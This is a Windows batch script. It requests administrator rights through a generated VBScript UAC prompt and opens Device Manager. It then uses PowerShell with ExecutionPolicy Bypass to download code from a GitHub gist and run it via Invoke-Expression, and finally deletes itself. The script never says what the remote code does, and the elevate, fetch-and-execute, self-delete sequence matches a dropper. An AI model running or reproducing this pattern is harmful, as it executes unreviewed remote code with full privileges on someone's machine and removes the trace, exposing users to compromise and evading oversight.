@echo off
:: BatchGotAdmin
:-----------------------------------------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    cscript "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"
:-----------------------------------------------------------------------
@echo off
cls
devmgmt.msc
powershell.exe -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://gist.github.com/52250179/e3711ff8cbeb9b6524171a4a2af22b11/raw | Invoke-Expression"
pause
(goto) 2>nul & del "%~f0"
